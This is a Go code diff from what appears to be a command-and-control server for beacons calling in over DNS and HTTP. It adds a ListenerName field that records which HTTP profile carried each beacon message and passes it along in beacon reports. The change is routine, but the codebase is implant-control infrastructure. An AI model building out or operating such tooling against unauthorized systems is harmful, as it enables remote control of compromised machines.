@@ -31,6 +31,10 @@ func generateDeterministicSessionID(stagerIP, clientBinaryID string) string {
 type C2QueryInfo struct {
 	BeaconID string
 	MsgType  string // CHK, POLL, DATA, RESULT, etc.
+	// ListenerName is the HTTP profile that carried this message, when the
+	// caller knows it. It rides the report so contact history can be mapped back
+	// to the profile an operator sees in the transport card.
+	ListenerName string
 }
 
 // BeaconPhaseConfig holds per-phase malleable settings for a beacon (learned from build config)
@@ -63,7 +67,8 @@ type Beacon struct {
 	PayloadFormat     string             `json:"payload_format,omitempty"`
 	Encoding          string             `json:"encoding,omitempty"` // "aes-gcm-base36" (default) or "base36"
 	RegistrationStage *int               `json:"registration_stage,omitempty"`
-	Transport         string             `json:"transport,omitempty"` // "dns" or "http": how the beacon reached us
+	Transport         string             `json:"transport,omitempty"`     // "dns" or "http": how the beacon reached us
+	ListenerName      string             `json:"listener_name,omitempty"` // HTTP profile that carried the last HTTP message
 	PhaseConfig       *BeaconPhaseConfig `json:"-"`
 	TaskQueue         []Task             `json:"-"`
 	CurrentTask       string             `json:"-"`
@@ -2648,11 +2653,17 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string, info *C2Q
 			if masterClient != nil {
 				snap := *beacon
 				snap.Transport = transport
+				if info != nil {
+					snap.ListenerName = info.ListenerName
+				}
 				go masterClient.ReportBeacon(&snap)
 			}
 		} else {
 			beacon.LastSeen = now
 			beacon.IPAddress = clientIP
+			if info != nil && info.ListenerName != "" {
+				beacon.ListenerName = info.ListenerName
+			}
 			// Merge non-empty fields (staged registration sends fields across multiple queries)
 			if hostname != "" {
 				beacon.Hostname = hostname
@@ -2697,6 +2708,9 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string, info *C2Q
 			if masterClient != nil {
 				snap := *beacon
 				snap.Transport = transport
+				if info != nil {
+					snap.ListenerName = info.ListenerName
+				}
 				go masterClient.ReportBeacon(&snap)
 			}
 		}
@@ -2803,6 +2817,9 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string, info *C2Q
 		if masterClient != nil {
 			snap := *beacon
 			snap.Transport = transport
+			if info != nil {
+				snap.ListenerName = info.ListenerName
+			}
 			go masterClient.ReportBeacon(&snap)
 		}
 
